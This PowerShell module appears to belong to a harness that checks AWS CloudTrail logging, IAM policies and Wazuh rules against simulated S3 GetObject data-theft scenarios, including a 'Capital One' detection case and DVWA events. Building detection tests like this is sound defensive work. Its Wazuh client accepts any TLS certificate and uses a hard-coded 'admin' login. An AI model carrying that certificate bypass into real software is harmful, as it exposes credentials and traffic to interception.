        throw (New-GtLiveFailure -Category 'missing_provider:primary_object')
    }
    $wrongIfMatch='"00000000000000000000000000000000"'
    if($etag -ceq $wrongIfMatch){$wrongIfMatch='"11111111111111111111111111111111"'}
    if($etag -ceq $wrongIfMatch){throw (New-GtLiveFailure -Category 'missing_provider:negative_failure')}
    $script:AdapterState.PrimaryObjectSha256 = $contentHash
    $script:AdapterState.PrimaryObjectEtag = $etag
    $script:AdapterState.FailureIfMatch = $wrongIfMatch
}

function Assert-GtLiveFoundationCloudTrail {
    $foundationRoot = [IO.Path]::GetFullPath((Join-Path $PSScriptRoot '..\..\foundation'))
    $enabled = Invoke-GtLiveTerraformOutput -WorkingDirectory $foundationRoot -Format raw -Name 'project_s3_data_events_enabled' -FailureCategory 'missing_provider:cloudtrail_data_events'
    if ($enabled.Trim().ToLowerInvariant() -cne 'true') { throw (New-GtLiveFailure -Category 'missing_provider:cloudtrail_data_events') }
    $detection = Invoke-GtLiveTerraformOutput -WorkingDirectory $foundationRoot -Format json -Name 'capital_one_s3_detection' -FailureCategory 'missing_provider:cloudtrail_detection' | ConvertFrom-Json
    if ([bool]$detection.enabled -ne $true -or [string]::IsNullOrWhiteSpace([string]$detection.alarm_name)) {
        throw (New-GtLiveFailure -Category 'missing_provider:cloudtrail_detection')
    }
    $group = ''
    try {
        $groups = Invoke-GtLiveTerraformOutput -WorkingDirectory $foundationRoot -Format json -Name 'security_log_group_names' -FailureCategory 'missing_provider:cloudtrail_log_group' | ConvertFrom-Json
        $group = [string]$groups.cloudtrail
    } catch {
        $group = (Invoke-GtLiveTerraformOutput -WorkingDirectory $foundationRoot -Format raw -Name 'security_cloudwatch_log_group_name' -FailureCategory 'missing_provider:cloudtrail_log_group').Trim()
    }
    if ($group -notmatch '^/[A-Za-z0-9._/#:+@=-]{1,512}$') { throw (New-GtLiveFailure -Category 'missing_provider:cloudtrail_log_group') }
    $resolved = Invoke-GtLiveNative -FilePath 'aws' -ArgumentList @(
        'logs','describe-log-groups','--profile',$AwsProfile,'--region',$script:AdapterExpectedRegion,
        '--log-group-name-prefix',$group,'--output','json','--no-cli-pager'
    ) -FailureCategory 'missing_provider:cloudtrail_log_group' | ConvertFrom-Json
    $exact = @($resolved.logGroups | Where-Object { [string]$_.logGroupName -ceq $group })
    if ($exact.Count -ne 1) { throw (New-GtLiveFailure -Category 'missing_provider:cloudtrail_log_group') }
    $trail = (Invoke-GtLiveTerraformOutput -WorkingDirectory $foundationRoot -Format raw -Name 'security_cloudtrail_name' -FailureCategory 'missing_provider:cloudtrail_selector').Trim()
    if ($trail -notmatch '^[A-Za-z0-9._-]{1,128}$') { throw (New-GtLiveFailure -Category 'missing_provider:cloudtrail_selector') }
    $selectors = Invoke-GtLiveNative -FilePath 'aws' -ArgumentList @(
        'cloudtrail','get-event-selectors','--profile',$AwsProfile,'--region',$script:AdapterExpectedRegion,
        '--trail-name',$trail,'--output','json','--no-cli-pager'
    ) -FailureCategory 'missing_provider:cloudtrail_selector' | ConvertFrom-Json
    $advanced = @($selectors.AdvancedEventSelectors)
    $dataSelector = @($advanced | Where-Object {
        $fields = @($_.FieldSelectors)
        $resourceArnFields = @($fields | Where-Object { [string]$_.Field -ceq 'resources.ARN' })
        $resourcePrefixes = if($resourceArnFields.Count -eq 1){@($resourceArnFields[0].StartsWith)}else{@()}
        $primaryObjectArn="arn:aws:s3:::$($script:AdapterState.ExpectedBucket)/$($script:AdapterExpectedObjectKey)"
        $otherPrefixObjectArn="arn:aws:s3:::$($script:AdapterState.ExpectedBucket)/$($script:AdapterState.OtherPrefixObjectKey)"
        $secondaryObjectArn="arn:aws:s3:::$($script:AdapterState.OtherBucket)/$($script:AdapterState.OtherBucketObjectKey)"
        ([string]$_.Name -ceq 'Project S3 canary object events') -and
        (@($fields | Where-Object { [string]$_.Field -ceq 'eventCategory' -and @($_.Equals) -contains 'Data' }).Count -eq 1) -and
        (@($fields | Where-Object { [string]$_.Field -ceq 'resources.type' -and @($_.Equals) -contains 'AWS::S3::Object' }).Count -eq 1) -and
        (@($fields | Where-Object { [string]$_.Field -ceq 'eventName' -and @($_.Equals) -contains 'GetObject' }).Count -eq 1) -and
        @($resourcePrefixes | Where-Object { $primaryObjectArn.StartsWith([string]$_,[StringComparison]::Ordinal) }).Count -ge 1 -and
        @($resourcePrefixes | Where-Object { $otherPrefixObjectArn.StartsWith([string]$_,[StringComparison]::Ordinal) }).Count -ge 1 -and
        @($resourcePrefixes | Where-Object { $secondaryObjectArn.StartsWith([string]$_,[StringComparison]::Ordinal) }).Count -ge 1
    })
    if ($dataSelector.Count -ne 1) { throw (New-GtLiveFailure -Category 'missing_provider:cloudtrail_selector') }
    $script:AdapterState.CloudTrailLogGroup = $group
    $script:AdapterState.CloudTrailName = $trail
}

function Assert-GtLiveRuleRoleContract {
    $role = Invoke-GtLiveNative -FilePath 'aws' -ArgumentList @(
        'iam','get-role','--profile',$AwsProfile,'--role-name',$script:AdapterExpectedRoleName,
        '--output','json','--no-cli-pager'
    ) -FailureCategory 'missing_provider:rule_contract' | ConvertFrom-Json
    if ([string]$role.Role.RoleName -cne $script:AdapterExpectedRoleName -or
        [string]$role.Role.Arn -notmatch [regex]::Escape($script:AdapterExpectedRoleName)) {
        throw (New-GtLiveFailure -Category 'missing_provider:rule_contract')
    }
    if (-not (Test-Path -LiteralPath $script:AdapterWazuhRulePath -PathType Leaf)) {
        throw (New-GtLiveFailure -Category 'missing_provider:rule_contract')
    }
    $ruleText = Get-Content -LiteralPath $script:AdapterWazuhRulePath -Raw -Encoding UTF8
    if ($ruleText -notmatch '(?s)<rule\s+id=["'']100104["'']\s+level=["'']12["''].*?</rule>' -or
        $ruleText -notmatch '(?s)<rule\s+id=["'']100104["''].*?eventName.*?GetObject.*?</rule>') {
        throw (New-GtLiveFailure -Category 'missing_provider:rule_contract')
    }
    $policy = Invoke-GtLiveNative -FilePath 'aws' -ArgumentList @(
        'iam','get-role-policy','--profile',$AwsProfile,'--role-name',$script:AdapterExpectedRoleName,
        '--policy-name','capital-one-validation-read','--output','json','--no-cli-pager'
    ) -FailureCategory 'missing_provider:validation_state' | ConvertFrom-Json
    $policyDocument = $policy.PolicyDocument
    if ($null -eq $policyDocument) { throw (New-GtLiveFailure -Category 'missing_provider:validation_state') }
    if($policyDocument -is [string]){$policyDocument=[uri]::UnescapeDataString([string]$policyDocument)|ConvertFrom-Json -Depth 100}
    $secondaryResource="arn:aws:s3:::$($script:AdapterState.OtherBucket)/$($script:AdapterState.OtherBucketObjectKey)"
    $secondaryStatements=@($policyDocument.Statement | Where-Object {
        [string]$_.Effect -ceq 'Allow' -and (@($_.Action) -join ',') -ceq 's3:GetObject' -and
        (@($_.Resource) -join ',') -ceq $secondaryResource
    })
    $otherPrefixResource="arn:aws:s3:::$($script:AdapterState.ExpectedBucket)/$($script:AdapterState.OtherPrefixObjectKey)"
    $otherPrefixStatements=@($policyDocument.Statement | Where-Object {
        [string]$_.Effect -ceq 'Allow' -and (@($_.Action) -join ',') -ceq 's3:GetObject' -and
        (@($_.Resource) -join ',') -ceq $otherPrefixResource
    })
    if($secondaryStatements.Count -ne 1 -or $otherPrefixStatements.Count -ne 1){throw (New-GtLiveFailure -Category 'missing_provider:validation_state')}
    $canonical = ConvertTo-GtLiveCanonicalJson $policyDocument
    $hash = Get-GtLiveSha256 $canonical
    $script:AdapterState.ValidationPolicySha256 = $hash
}

function Assert-GtLiveNegativeFixtures {
    if ([string]$script:AdapterState.OtherPrefixObjectKey -cne $script:AdapterExpectedOtherPrefixObjectKey -or
        [string]$script:AdapterState.OtherPrefixObjectSha256 -notmatch '^[a-f0-9]{64}$') {
        throw (New-GtLiveFailure -Category 'missing_provider:negative_other_prefix')
    }
    # The failure fixture uses the same role, bucket, and protected object as
    # the positive.  Only a guaranteed-wrong If-Match header differs.
    if ([string]$script:AdapterState.PrimaryObjectEtag -notmatch '^"[0-9a-fA-F]{32}(-[0-9]+)?"$' -or
        [string]$script:AdapterState.FailureIfMatch -notmatch '^"[0-9a-fA-F]{32}"$' -or
        [string]$script:AdapterState.FailureIfMatch -ceq [string]$script:AdapterState.PrimaryObjectEtag) {
        throw (New-GtLiveFailure -Category 'missing_provider:negative_failure')
    }
}

function Invoke-GtLivePreflight {
    [void](Get-GtLiveSession)
    Assert-GtLiveShuffleIntegrationInactive
    Assert-GtLiveProviderIdentity
    $script:AdapterState.ExpectedBucket = Resolve-GtLiveExpectedBucket
    $script:AdapterState.OtherBucket = Resolve-GtLiveOtherBucket
    [void](Resolve-GtLiveOtherPrefixObject)
    Assert-GtLivePrincipalFixtures
    Assert-GtLivePrimaryObject
    Assert-GtLiveFoundationCloudTrail
    Assert-GtLiveRuleRoleContract
    Assert-GtLiveNegativeFixtures
    # Exercise every read-only query provider before the first attack.  These
    # snapshots are deliberately in-memory and are not evidence bundles.
    $now = [DateTimeOffset]::UtcNow
    $script:AdapterState.PreflightBaseline = Get-GtLiveBaseline -CapturedAt $now
    $script:AdapterState.PreflightSideEffects = Get-GtLiveSideEffectSnapshot -Context ([pscustomobject]@{
        gate='GT02-GT03'; phase='preflight-side-effect-baseline'; take_index=0; take_count=3
    })
}

function Get-GtLiveBridgeRecords {
    param([Parameter(Mandatory)][DateTimeOffset]$WindowStart,[Parameter(Mandatory)][DateTimeOffset]$WindowEnd)
    [void](Assert-GtLiveObservationBudget)
    $path = [string]$script:AdapterState.LivePath
    if (-not (Test-Path -LiteralPath $path -PathType Leaf)) { throw (New-GtLiveFailure -Category 'missing_bridge_spool') }
    $item = Get-Item -LiteralPath $path
    if ($item.Length -gt 128MB) { throw (New-GtLiveFailure -Category 'bridge_spool_too_large') }
    $out = [Collections.Generic.List[object]]::new()
    $stream = [IO.File]::Open($path,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::ReadWrite)
    $reader = [IO.StreamReader]::new($stream,[Text.UTF8Encoding]::new($false),$true)
    try {
        while (-not $reader.EndOfStream) {
            $line = $reader.ReadLine()
            if ([string]::IsNullOrWhiteSpace($line)) { continue }
            if ($line.Length -gt 1048576) { throw (New-GtLiveFailure -Category 'bridge_record_too_large') }
            try { $raw = $line | ConvertFrom-Json -Depth 100 } catch { throw (New-GtLiveFailure -Category 'bridge_invalid_json') }
            $eventTime = Get-GtLiveProperty $raw @('event_time','event_time_utc')
            if ($null -eq $eventTime) { continue }
            try { $when = Convert-GtLiveUtc $eventTime } catch { continue }
            if ($when -lt $WindowStart.AddSeconds(-5) -or $when -gt $WindowEnd) { continue }
            $payload = Get-GtLiveProperty $raw @('payload')
            $context = Get-GtLiveProperty $payload @('context')
            $id = [string](Get-GtLiveProperty $raw @('event_id','id'))
            if ($id -notmatch '^[A-Za-z0-9._:/-]{1,200}$') { continue }
            $out.Add([pscustomobject][ordered]@{
                event_id=$id; event_time_utc=$when.ToString('o'); source=[string](Get-GtLiveProperty $raw @('source'))
                transport=[string](Get-GtLiveProperty $raw @('transport')); aws_account_id=[string](Get-GtLiveProperty $raw @('aws_account_id','account_id'))
                aws_region=[string](Get-GtLiveProperty $raw @('aws_region','region')); raw_message_sha256=[string](Get-GtLiveProperty $raw @('raw_message_sha256'))
                payload=$payload
            })
        }
    } finally { $reader.Dispose(); $stream.Dispose() }
    [void](Assert-GtLiveObservationBudget)
    return @($out)
}

function Add-GtLiveExternalTakeId {
    param([Parameter(Mandatory)][object]$Record,[Parameter(Mandatory)][string]$TakeId)
    # TAKE_ID is runner metadata only.  This adds it to the in-memory adapter
    # projection after event correlation; it is never sent to DVWA/Wazuh or
    # written to the bridge spool.
    $copy = $Record | ConvertTo-Json -Depth 100 -Compress | ConvertFrom-Json -Depth 100
    $source = Get-GtLiveProperty $copy @('_source')
    if ($null -eq $source) { $source = $copy }
    $data = Get-GtLiveProperty $source @('data')
    if ($null -eq $data) { $data = $source }
    $payload = Get-GtLiveProperty $data @('payload')
    if ($null -ne $payload) {
        $payload | Add-Member -NotePropertyName take_id -NotePropertyValue $TakeId -Force
    } else {
        $data | Add-Member -NotePropertyName take_id -NotePropertyValue $TakeId -Force
    }
    return $copy
}

function Get-GtLiveAlertEventId {
    param([Parameter(Mandatory)][object]$Alert)
    $source = Get-GtLiveProperty $Alert @('_source'); if ($null -eq $source) { $source = $Alert }
    $data = Get-GtLiveProperty $source @('data'); if ($null -eq $data) { $data = $source }
    $aws = Get-GtLiveProperty $data @('aws'); if ($null -eq $aws) { $aws = $data }
    $payload = Get-GtLiveProperty $data @('payload')
    foreach ($object in @($aws,$data,$payload)) {
        $id = [string](Get-GtLiveProperty $object @('eventID','event_id'))
        if ($id -match '^[0-9a-fA-F-]{36}$') { return $id }
    }
    return ''
}

function Assert-GtLiveWazuhScrollPage {
    param(
        [Parameter(Mandatory)][object]$Response,
        [Parameter(Mandatory)][ValidateRange(0, 4)][int]$PageIndex,
        [AllowNull()][Nullable[int]]$ExpectedTotal
    )
    $timedOut = Get-GtLiveProperty -Object $Response -Names @('timed_out')
    $shards = Get-GtLiveProperty -Object $Response -Names @('_shards')
    $hitsObject = Get-GtLiveProperty -Object $Response -Names @('hits')
    $totalObject = Get-GtLiveProperty -Object $hitsObject -Names @('total')
    $relation = [string](Get-GtLiveProperty -Object $totalObject -Names @('relation'))
    $totalValue = Get-GtLiveProperty -Object $totalObject -Names @('value')
    $failedShards = Get-GtLiveProperty -Object $shards -Names @('failed')
    $pageHitsProperty = $null
    if ($hitsObject -is [Collections.IDictionary] -and $hitsObject.Contains('hits')) {
        $pageHitsProperty = [pscustomobject]@{ Value = $hitsObject['hits'] }
    } elseif ($null -ne $hitsObject) {
        $pageHitsProperty = @($hitsObject.PSObject.Properties | Where-Object Name -ieq 'hits' | Select-Object -First 1)
        if ($pageHitsProperty.Count -eq 1) { $pageHitsProperty = $pageHitsProperty[0] } else { $pageHitsProperty = $null }
    }
    if ($null -eq $timedOut -or [bool]$timedOut -ne $false -or
        $null -eq $failedShards -or [int]$failedShards -ne 0 -or
        $relation -cne 'eq' -or $null -eq $totalValue -or
        [int64]$totalValue -lt 0 -or [int64]$totalValue -gt 1000 -or
        $null -eq $pageHitsProperty) {
        throw (New-GtLiveFailure -Category 'wazuh_query_incomplete')
    }
    $total = [int]$totalValue
    if ($null -ne $ExpectedTotal -and $total -ne [int]$ExpectedTotal) {
        throw (New-GtLiveFailure -Category 'wazuh_query_incomplete')
    }
    $pageHits = @($pageHitsProperty.Value)
    if ($pageHits.Count -gt 200) {
        throw (New-GtLiveFailure -Category 'wazuh_query_incomplete')
    }
    return [pscustomobject][ordered]@{
        page_index = $PageIndex
        total = $total
        hits = $pageHits
    }
}

function Invoke-GtLiveWazuhSearch {
    param([Parameter(Mandatory)][string]$RuleId,[Parameter(Mandatory)][DateTimeOffset]$WindowStart,[Parameter(Mandatory)][DateTimeOffset]$WindowEnd)
    [void](Assert-GtLiveObservationBudget)
    if ($script:AdapterState.WazuhPassword -notmatch '^.{8,}$') { throw (New-GtLiveFailure -Category 'missing_wazuh_secret') }
    # A scroll context gives a bounded, complete point-in-time result set
    # without relying on the unsupported/unstable _id sort tiebreaker.
    $query = [ordered]@{ size=200; sort=@('_doc'); query=[ordered]@{ bool=[ordered]@{ filter=@(
        @{term=@{'rule.id'=$RuleId}}, @{range=[ordered]@{'@timestamp'=[ordered]@{gte=$WindowStart.ToString('o');lte=$WindowEnd.ToString('o')}}}
    ) } } }
    $handler = [Net.Http.HttpClientHandler]::new(); $handler.ServerCertificateCustomValidationCallback = { $true }
    $client = [Net.Http.HttpClient]::new($handler); $client.Timeout=[timespan]::FromSeconds(20)
    $bytes = [Text.Encoding]::UTF8.GetBytes("admin:$($script:AdapterState.WazuhPassword)")
    $all=[Collections.Generic.List[object]]::new();$seen=[Collections.Generic.HashSet[string]]::new([StringComparer]::Ordinal);$scrollId='';$page=0;$completed=$false;$expectedTotal=$null
    try {
        while ($page -lt 5) {
            [void](Assert-GtLiveObservationBudget)
            $path = if ($page -eq 0) {
                '/wazuh-alerts-4.x-*/_search?scroll=1m'
            } else {
                '/_search/scroll'
            }
            $body = if ($page -eq 0) {
                $query
            } else {
                [ordered]@{ scroll='1m'; scroll_id=$scrollId }
            }
            $request = [Net.Http.HttpRequestMessage]::new([Net.Http.HttpMethod]::Post,[uri]('https://127.0.0.1:9200' + $path))
            $request.Headers.Authorization=[Net.Http.Headers.AuthenticationHeaderValue]::new('Basic',[Convert]::ToBase64String($bytes))
            $request.Content=[Net.Http.StringContent]::new(($body|ConvertTo-Json -Depth 30 -Compress),[Text.Encoding]::UTF8,'application/json')
            $response=$client.SendAsync($request).GetAwaiter().GetResult()
            [void](Assert-GtLiveObservationBudget)
            if ([int]$response.StatusCode -ne 200) { throw 'status' }
            $text=$response.Content.ReadAsStringAsync().GetAwaiter().GetResult(); if ($text.Length -gt 8388608) { throw 'large' }
            $json=$text|ConvertFrom-Json -Depth 100
            $scrollId=[string]$json._scroll_id
            if ([string]::IsNullOrWhiteSpace($scrollId)) { throw 'scroll_id' }
            $validated = Assert-GtLiveWazuhScrollPage -Response $json -PageIndex $page -ExpectedTotal $expectedTotal
            if ($null -eq $expectedTotal) { $expectedTotal = [int]$validated.total }
            $hits=@($validated.hits)
            foreach ($hit in $hits) {
                $id=[string]$hit._id
                if($id -notmatch '^[A-Za-z0-9._:/-]{1,200}$' -or -not $seen.Add($id)){throw 'invalid_or_duplicate_id'}
                $all.Add([pscustomobject]@{_id=$id;_source=$hit._source})
            }
            $request.Content.Dispose();$request.Dispose();$response.Dispose()
            $page++
            if($all.Count -eq [int]$expectedTotal){$completed=$true;break}
            if($all.Count -gt [int]$expectedTotal -or $hits.Count -eq 0 -or $hits.Count -lt 200){throw 'incomplete_page'}
        }
        if (-not $completed -or $all.Count -ne [int]$expectedTotal) { throw 'pagination_cap' }
        [void](Assert-GtLiveObservationBudget)
        return @($all)
    } catch {
        if([string]$_.Exception.Message -match 'run_observation_budget_exhausted'){throw $_.Exception}
        throw (New-GtLiveFailure -Category 'wazuh_query')
    }
    finally {
        if ($scrollId) {
            try {
                $clear = [Net.Http.HttpRequestMessage]::new([Net.Http.HttpMethod]::Delete,[uri]'https://127.0.0.1:9200/_search/scroll')
                $clear.Headers.Authorization=[Net.Http.Headers.AuthenticationHeaderValue]::new('Basic',[Convert]::ToBase64String($bytes))
                $clear.Content=[Net.Http.StringContent]::new((([ordered]@{scroll_id=@($scrollId)}|ConvertTo-Json -Depth 10 -Compress)),[Text.Encoding]::UTF8,'application/json')
                $clearResponse=$client.SendAsync($clear).GetAwaiter().GetResult()
                $clear.Content.Dispose();$clear.Dispose();$clearResponse.Dispose()
            } catch { }
        }
        [Array]::Clear($bytes,0,$bytes.Length);$client.Dispose();$handler.Dispose()
    }
}

function Get-GtLiveWazuhAlerts {
    param([Parameter(Mandatory)][string]$RuleId,[Parameter(Mandatory)][DateTimeOffset]$WindowStart,[Parameter(Mandatory)][DateTimeOffset]$WindowEnd,[string]$ExternalTakeId='',[string]$CorrelationKey='')
    [void](Assert-GtLiveObservationBudget)
    $rows = @(Invoke-GtLiveWazuhSearch -RuleId $RuleId -WindowStart $WindowStart -WindowEnd $WindowEnd)
    if ($RuleId -ceq '100103' -and $CorrelationKey -and $script:AdapterState.Correlations.Contains($CorrelationKey)) {
        $ids = [Collections.Generic.HashSet[string]]::new([StringComparer]::Ordinal)
        foreach ($id in @($script:AdapterState.Correlations[$CorrelationKey])) { [void]$ids.Add([string]$id) }
        $rows = @($rows | Where-Object { $ids.Contains((Get-GtLiveAlertEventId -Alert $_)) })
    }
    if ($ExternalTakeId) { $rows = @($rows | ForEach-Object { Add-GtLiveExternalTakeId -Record $_ -TakeId $ExternalTakeId }) }
    return $rows
}

function Get-GtLiveCloudTrail {
    param([Parameter(Mandatory)][DateTimeOffset]$WindowStart,[Parameter(Mandatory)][DateTimeOffset]$WindowEnd)
    [void](Assert-GtLiveObservationBudget)
    $query='fields @timestamp,eventTime,eventID,recipientAccountId,awsRegion,eventSource,eventName,userIdentity.sessionContext.sessionIssuer.userName,userIdentity.sessionContext.sessionIssuer.arn,userIdentity.arn,requestParameters.bucketName,requestParameters.key,additionalEventData.httpStatusCode,errorCode | filter eventSource = "s3.amazonaws.com" | filter eventName = "GetObject" | sort eventTime asc | limit 1000'
    $start=[DateTimeOffset]$WindowStart; $end=[DateTimeOffset]$WindowEnd
    $startEpoch=[long]$start.ToUnixTimeSeconds();$endEpoch=[long]$end.ToUnixTimeSeconds()
    if ([string]::IsNullOrWhiteSpace([string]$script:AdapterState.CloudTrailLogGroup)) { throw (New-GtLiveFailure -Category 'missing_provider:cloudtrail_log_group') }
    $startText=Invoke-GtLiveNative -FilePath 'aws' -ArgumentList @('logs','start-query','--profile',$AwsProfile,'--region',$script:AdapterExpectedRegion,'--log-group-name',[string]$script:AdapterState.CloudTrailLogGroup,'--start-time',[string]$startEpoch,'--end-time',[string]$endEpoch,'--query-string',$query,'--output','json','--no-cli-pager') -FailureCategory 'cloudtrail_query'
    try {$queryId=[string](($startText|ConvertFrom-Json).queryId)}catch{throw (New-GtLiveFailure -Category 'cloudtrail_shape')}
    if($queryId -notmatch '^[a-z0-9-]{8,200}$'){throw (New-GtLiveFailure -Category 'cloudtrail_shape')}
    # CloudWatch Logs Insights can complete successfully before a delayed
    # CloudTrail data event has arrived.  Poll to the provider deadline rather
    # than deriving a one-second deadline from an already elapsed event window.
    $rows=@();$deadline=Get-GtLivePollDeadline -WindowEnd $end;$completed=$false
    do {
        [void](Assert-GtLiveObservationBudget)
        $pollText=Invoke-GtLiveNative -FilePath 'aws' -ArgumentList @('logs','get-query-results','--profile',$AwsProfile,'--region',$script:AdapterExpectedRegion,'--query-id',$queryId,'--output','json','--no-cli-pager') -FailureCategory 'cloudtrail_query'
        [void](Assert-GtLiveObservationBudget)
        try{$poll=$pollText|ConvertFrom-Json -Depth 30}catch{throw (New-GtLiveFailure -Category 'cloudtrail_shape')}
        if([string]$poll.status -ceq 'Complete'){$rows=@($poll.results);if($rows.Count -ge 1000){throw (New-GtLiveFailure -Category 'cloudtrail_query_cap')};$completed=$true;break}
        if([string]$poll.status -in @('Failed','Cancelled','Timeout')){throw (New-GtLiveFailure -Category 'cloudtrail_query')}
        Start-Sleep -Seconds 2
    }while([DateTimeOffset]::UtcNow -lt $deadline)
    if (-not $completed) { throw (New-GtLiveFailure -Category 'cloudtrail_query_timeout') }
    if($null -eq $rows){$rows=@()}
    $out=[Collections.Generic.List[object]]::new()
    foreach($row in @($rows)) {
        $map=@{};foreach($field in @($row)){if($field.field -and $field.value){$map[[string]$field.field]=[string]$field.value}}
        $id=[string]$map.eventID;if($id -notmatch '^[0-9a-fA-F-]{36}$'){continue}
        $role=[string]$map.'userIdentity.sessionContext.sessionIssuer.userName';if([string]::IsNullOrWhiteSpace($role)){$role=[string]$map.'userIdentity.arn'}
        $error=[string]$map.errorCode;$status=[string]$map.'additionalEventData.httpStatusCode';if([string]::IsNullOrWhiteSpace($status) -and [string]::IsNullOrWhiteSpace($error)){$status='200'}
        $out.Add([pscustomobject]@{id=$id;event_time_utc=[string]$map.eventTime;event_source=[string]$map.eventSource;event_name=[string]$map.eventName;account_id=[string]$map.recipientAccountId;region=[string]$map.awsRegion;role_name=$role;principal_arn=[string]$map.'userIdentity.arn';session_issuer_arn=[string]$map.'userIdentity.sessionContext.sessionIssuer.arn';bucket=[string]$map.'requestParameters.bucketName';object_key=[string]$map.'requestParameters.key';http_status=$status;error_code=$error})
    }
    return @($out)
}

function Get-GtLiveBaseline {
    param([Parameter(Mandatory)][DateTimeOffset]$CapturedAt)
    [void](Assert-GtLiveObservationBudget)
    $start=$CapturedAt.AddSeconds(-$script:AdapterState.LookbackSeconds)
    $bridge=@(Get-GtLiveBridgeRecords -WindowStart $start -WindowEnd $CapturedAt)
    $a103=@(Get-GtLiveWazuhAlerts -RuleId '100103' -WindowStart $start -WindowEnd $CapturedAt)
    $a104=@(Get-GtLiveWazuhAlerts -RuleId '100104' -WindowStart $start -WindowEnd $CapturedAt)
    $ct=@(Get-GtLiveCloudTrail -WindowStart $start -WindowEnd $CapturedAt)
    $baseline = [pscustomobject]@{
        captured_at_utc=$CapturedAt.ToString('o')
        bridge_event_ids=@($bridge|ForEach-Object {[string]$_.event_id}|Sort-Object -Unique)
        rule100103_alert_ids=@($a103|ForEach-Object {[string](Get-GtLiveProperty -Object $_ -Names @('_id'))}|Where-Object {$_}|Sort-Object -Unique)
        rule100104_alert_ids=@($a104|ForEach-Object {[string](Get-GtLiveProperty -Object $_ -Names @('_id'))}|Where-Object {$_}|Sort-Object -Unique)
        cloudtrail_event_ids=@($ct|ForEach-Object {[string]$_.id}|Sort-Object -Unique)
        quiescence_proven=$true
    }
    return $baseline
}

function Get-GtLivePollDeadline {
    param([Parameter(Mandatory)][DateTimeOffset]$WindowEnd)
    # WindowEnd describes the event correlation range, not the query's wall
    # clock deadline.  It is commonly in the past by the time CloudTrail or
    # Wazuh is queried, so never collapse the bounded wait to WindowEnd.
    $runDeadline = Assert-GtLiveObservationBudget
    $perQueryDeadline = [DateTimeOffset]::UtcNow.AddSeconds([int]$script:AdapterState.PollDeadlineSeconds)
    if ($runDeadline -lt $perQueryDeadline) {
        return $runDeadline
    }
    return $perQueryDeadline
}

function Register-GtLiveObservedIds {
    param([Parameter(Mandatory)][string]$Channel,[Parameter(Mandatory)][AllowEmptyCollection()][string[]]$Ids)
    if ($null -eq $script:AdapterState.ObservedIds[$Channel]) {
        $script:AdapterState.ObservedIds[$Channel] = [Collections.Generic.HashSet[string]]::new([StringComparer]::Ordinal)
    }
    foreach ($id in $Ids) {
        if ($id) { [void]$script:AdapterState.ObservedIds[$Channel].Add([string]$id) }
    }
}

function Wait-GtLiveBridgeRecords {
    param([Parameter(Mandatory)][DateTimeOffset]$WindowStart,[Parameter(Mandatory)][DateTimeOffset]$WindowEnd,[Parameter(Mandatory)][AllowEmptyString()][string]$ExternalTakeId,[Parameter(Mandatory)][string]$CorrelationKey,[int]$ExpectedCount=-1,[switch]$RequireFullWindow)
    [void](Assert-GtLiveObservationBudget)
    $deadline=Get-GtLivePollDeadline -WindowEnd $WindowEnd
    $previousKey=$null;$stable=0;$last=@()
    do {
        [void](Assert-GtLiveObservationBudget)
        $rows=@(Get-GtLiveBridgeRecords -WindowStart $WindowStart -WindowEnd $WindowEnd | Where-Object {
            [string]$_.source -ceq 'dvwa' -and [string]$_.transport -ceq 'push' -and
            [string]$_.aws_account_id -ceq $script:AdapterExpectedAccountId -and
            [string]$_.aws_region -ceq $script:AdapterExpectedRegion
        })
        $ids=@($rows|ForEach-Object {[string]$_.event_id}|Sort-Object -Unique)
        $key=($ids -join ',')
        if ($null -ne $previousKey -and $key -ceq $previousKey) { $stable++ } else { $previousKey=$key;$stable=0 }
        $last=$rows
        $countReady = if($ExpectedCount -ge 0){$rows.Count -ge $ExpectedCount}else{$rows.Count -gt 0}
        $windowReady = (-not $RequireFullWindow) -or [DateTimeOffset]::UtcNow -ge $WindowEnd
        if($countReady -and $windowReady -and $stable -ge $script:AdapterStablePolls){
            $script:AdapterState.Correlations[$CorrelationKey]=@($ids)
            Register-GtLiveObservedIds -Channel 'bridge' -Ids $ids
            if ($ExternalTakeId) { return @($rows|ForEach-Object { Add-GtLiveExternalTakeId -Record $_ -TakeId $ExternalTakeId }) }
            return @($rows)
        }
        Start-Sleep -Seconds 2
    } while([DateTimeOffset]::UtcNow -lt $deadline)
    [void](Assert-GtLiveObservationBudget)
    if($RequireFullWindow -and [DateTimeOffset]::UtcNow -lt $WindowEnd){throw (New-GtLiveFailure -Category 'observation_window_incomplete')}
    Register-GtLiveObservedIds -Channel 'bridge' -Ids @($last | ForEach-Object {[string]$_.event_id})
    if ($ExternalTakeId) { return @($last|ForEach-Object { Add-GtLiveExternalTakeId -Record $_ -TakeId $ExternalTakeId }) }
    return @($last)
}

function Wait-GtLiveWazuhAlerts {
    param([Parameter(Mandatory)][string]$RuleId,[Parameter(Mandatory)][DateTimeOffset]$WindowStart,[Parameter(Mandatory)][DateTimeOffset]$WindowEnd,[Parameter(Mandatory)][bool]$WaitForEmpty,[string]$ExternalTakeId='',[string]$CorrelationKey='',[int]$ExpectedCount=-1,[switch]$RequireFullWindow)
    [void](Assert-GtLiveObservationBudget)
    $deadline=Get-GtLivePollDeadline -WindowEnd $WindowEnd
    $last=@();$previousKey=$null;$stable=0
    do {
        [void](Assert-GtLiveObservationBudget)
        $rows=@(Get-GtLiveWazuhAlerts -RuleId $RuleId -WindowStart $WindowStart -WindowEnd $WindowEnd -ExternalTakeId $ExternalTakeId -CorrelationKey $CorrelationKey)
        $key=((@($rows|ForEach-Object { [string](Get-GtLiveProperty $_ @('_id','id')) }|Sort-Object -Unique)-join ','))
        if($null -ne $previousKey -and $key -ceq $previousKey){$stable++}else{$previousKey=$key;$stable=0}
        $last=$rows
        $countReady = if($WaitForEmpty){$rows.Count -eq 0}elseif($ExpectedCount -ge 0){$rows.Count -ge $ExpectedCount}else{$rows.Count -gt 0}
        $windowReady = (-not ($WaitForEmpty -or $RequireFullWindow)) -or [DateTimeOffset]::UtcNow -ge $WindowEnd
        if($countReady -and $windowReady -and $stable -ge $script:AdapterStablePolls){
            Register-GtLiveObservedIds -Channel $(if($RuleId -ceq '100103'){'rule100103'}else{'rule100104'}) -Ids @($rows | ForEach-Object { [string](Get-GtLiveProperty $_ @('_id','id')) })
            return $rows
        }
        Start-Sleep -Seconds 2
    } while([DateTimeOffset]::UtcNow -lt $deadline)
    [void](Assert-GtLiveObservationBudget)
    if(($WaitForEmpty -or $RequireFullWindow) -and [DateTimeOffset]::UtcNow -lt $WindowEnd){throw (New-GtLiveFailure -Category 'observation_window_incomplete')}
